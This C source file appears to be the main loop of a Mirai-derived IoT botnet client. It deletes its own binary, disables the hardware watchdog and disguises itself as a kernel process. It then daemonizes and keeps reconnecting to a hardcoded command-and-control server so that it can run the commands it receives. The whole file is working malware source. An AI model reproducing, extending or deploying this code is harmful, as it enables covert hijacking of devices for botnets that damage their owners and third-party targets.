#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>

#ifndef DEBUG
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#endif

#include "constants.h"
#include "protocol.h"
#include "scanner.h"
#include "rand.h"
#include "serialization.h"
#include "util.h"

static int establish_connection(void);

int main(int argc, char *argv[]) {
    int server_fd;
    int failedtries;

#ifndef DEBUG
    int wfd;
#endif

#ifdef DEBUG
    fprintf(stderr, "[+] Debug Mode\n");
#endif

#ifndef DEBUG
    unlink(argv[0]); /* Delete our executable */

    /* mirai: prevent watchdog from rebooting device */
    if ((wfd = open("/dev/watchdog", 2)) != -1 ||
        (wfd = open("/dev/misc/watchdog", 2)) != -1) {
        int one = 1;

        ioctl(wfd, 0x80045704, &one);
        close(wfd);
        wfd = 0;
    }
    chdir("/"); /* mirai: presumably writable? */
#endif

#ifndef DEBUG
    /* Rename process to generic sounding kernel process */
    strcpy(argv[0], PROCESS_NAME); 
    prctl(PR_SET_NAME, (unsigned long)PROCESS_NAME);
#endif

    rand_init();

#ifndef DEBUG /* mirai: don't accidentally write to stdout and also give us \
                 some more fds */
    if (fork() > 0) {
        return(EXIT_SUCCESS);
    }
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
#endif

/*    scanner_init(); */

    failedtries = 0;
    server_fd = establish_connection();

    while (1) {
        if (server_fd == -1) {
            failedtries++;
            sleep((unsigned int)(rand_range(0, 5) * failedtries *
                                 (failedtries / 2))); /* safe cast - low numbers
          - sleep increasingly more as attemps fail */
            server_fd = establish_connection();
            if (server_fd !=
                -1) { /* restart counter if we successfully connect */
#ifdef DEBUG
                fprintf(stderr,
                        "[+] Successfully connected, restarting failed tries "
                        "counter to 0\n");
#endif
                failedtries = 0;
            }
            continue; /* start over and see if we successfully connected or not
                       */
        }

        server_fd = protocol_message_receive_and_process(server_fd);
    }

    close(server_fd);
    return (EXIT_SUCCESS);
}

static int establish_connection(void) {
    struct sockaddr_in cnc;
    int sockfd;

    if ((sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) ==
        -1) { /* ipv4, tcp */
#ifdef DEBUG
        perror("failed to create socket");
#endif
        /* TODO: Implement something to do if we can't create socket, maybe
         * retry */
        return -1;
    }

    memset(cnc.sin_zero, '\0', sizeof(cnc.sin_zero));
    cnc.sin_family = AF_INET;
    cnc.sin_port = htons(CNC_PORT);
    cnc.sin_addr.s_addr = inet_addr(CNC_IP);
    if (connect(sockfd, (struct sockaddr *)&cnc, sizeof(struct sockaddr_in)) ==
        -1) {
#ifdef DEBUG
        perror("connect");
#endif
        close(sockfd);
        return -1;
    }
#ifdef DEBUG
    else {
        fprintf(stderr, "[+] Connected to CNC\n");
    }
#endif

    return sockfd;
}
